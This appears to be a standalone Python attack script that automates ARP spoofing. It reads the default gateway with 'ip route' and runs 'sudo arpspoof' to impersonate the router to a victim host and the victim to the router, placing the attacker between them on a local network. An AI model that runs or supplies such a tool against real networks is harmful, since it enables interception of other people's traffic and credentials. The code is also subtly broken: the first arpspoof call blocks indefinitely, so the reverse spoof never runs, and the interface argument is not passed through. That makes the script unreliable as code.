import subprocess


def perform_arp_spoof(victim_ip, iface="eth0"):
    router_ip = subprocess.check_output(
        ["ip", "route"], encoding="utf-8").split("default via ")[1].split()[0]

    run_arpspoof(victim_ip, router_ip)


def run_arpspoof(victim_ip, router_ip, iface="eth0"):
    """
    Sends unsolicited ARP replies to the victim and the router.
    """
    try:
        # Step 1: Send ARP reply to the victim (spoofing the router)
        subprocess.run(["sudo", "arpspoof", "-i", iface, "-t",
                       victim_ip, router_ip], check=True)
        print(
            f"[*] Sent ARP reply to victim {victim_ip} (pretending to be {router_ip}).")

        # Step 2: Send ARP reply to the router (spoofing the victim)
        subprocess.run(["sudo", "arpspoof", "-i", iface, "-t",
                       router_ip, victim_ip], check=True)
        print(
            f"[*] Sent ARP reply to router {router_ip} (pretending to be {victim_ip}).")

    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to execute arpspoof: {e}")
